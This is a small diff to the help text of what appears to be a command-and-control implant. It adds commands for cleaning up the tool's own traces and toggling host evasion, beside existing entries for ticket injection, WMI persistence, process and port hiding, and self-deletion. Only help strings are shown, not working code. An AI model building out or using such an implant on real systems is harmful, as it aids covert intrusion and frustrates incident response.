@@ -235,6 +235,8 @@ function printHelp() {
   writeLine('    kerberos ptt <base64>     Submit a kirbi (KRB_CRED) into LSA')
   writeLine('    ad_enum                   Active Directory enumeration')
   writeLine('    wmi_persist               WMI persistence install')
+  writeLine('    cleanup [scope ..]        Clean up own traces: all|persist|files|uac|wmi')
+  writeLine('    evasion [on|off <key>]    Toggle host evasion at runtime (status/all/reset)')
   writeLine('    hideprocess [on/off]      Masquerade process name (Linux)')
   writeLine('    hidenet <on/off> <port>   Hide listening port (Linux)')
   writeLine('    selfdelete                Unlock & delete beacon binary (stay online)')
